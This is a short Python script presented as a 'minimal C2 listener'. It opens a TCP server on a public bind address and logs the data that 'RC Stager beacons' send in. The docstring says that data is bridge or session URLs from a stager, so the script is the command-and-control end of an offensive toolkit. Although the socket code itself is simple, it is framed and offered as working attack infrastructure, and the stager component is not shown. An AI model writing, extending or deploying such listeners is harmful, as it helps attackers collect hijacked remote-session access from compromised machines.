#!/usr/bin/env python3
"""
Minimal C2 listener — receives bridge/session URLs from rc_stager.

Usage:
    python c2_listener.py [--host 0.0.0.0] [--port 9090]
"""

import argparse
import socket
import threading
from datetime import datetime, timezone


def handle_client(conn: socket.socket, addr: tuple[str, int]) -> None:
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    try:
        data = conn.recv(4096).decode("utf-8", errors="replace").strip()
        if data:
            print(f"[{ts}] {addr[0]}:{addr[1]} → {data}", flush=True)
    except OSError as e:
        print(f"[{ts}] {addr[0]}:{addr[1]} error: {e}")
    finally:
        conn.close()


def main() -> None:
    parser = argparse.ArgumentParser(description="C2 listener for RC Stager beacons")
    parser.add_argument(
        "--host", default="0.0.0.0", help="Bind address (default: 0.0.0.0)"
    )
    parser.add_argument(
        "--port", type=int, default=9090, help="Listen port (default: 9090)"
    )
    args = parser.parse_args()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((args.host, args.port))
    srv.listen(8)
    print(f"[c2] listening on {args.host}:{args.port}", flush=True)

    try:
        while True:
            conn, addr = srv.accept()
            threading.Thread(
                target=handle_client, args=(conn, addr), daemon=True
            ).start()
    except KeyboardInterrupt:
        print("\n[c2] shutting down")
    finally:
        srv.close()


if __name__ == "__main__":
    main()
